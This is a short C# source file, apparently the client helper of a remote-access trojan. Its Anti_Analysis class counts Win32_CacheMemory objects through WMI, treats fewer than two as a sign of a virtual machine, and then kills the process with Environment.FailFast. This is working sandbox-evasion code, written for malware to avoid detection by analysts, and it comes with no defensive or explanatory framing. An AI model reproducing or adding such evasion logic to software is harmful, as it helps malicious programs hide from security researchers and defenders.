using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;

namespace Client.Helper
{

    class Anti_Analysis
    {
        public static void RunAntiAnalysis()
        {
            if (isVM_by_wim_temper()) 
            {
                Environment.FailFast(null);
            }
            Thread.Sleep(1000);
        }
        public static bool isVM_by_wim_temper()
        {            
            SelectQuery selectQuery = new SelectQuery("Select * from Win32_CacheMemory");
            //SelectQuery selectQuery = new SelectQuery("Select * from CIM_Memory");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
            int i = 0;
            foreach (ManagementObject DeviceID in searcher.Get()) 
                i++;
            return (i < 2);
        }
    }
}
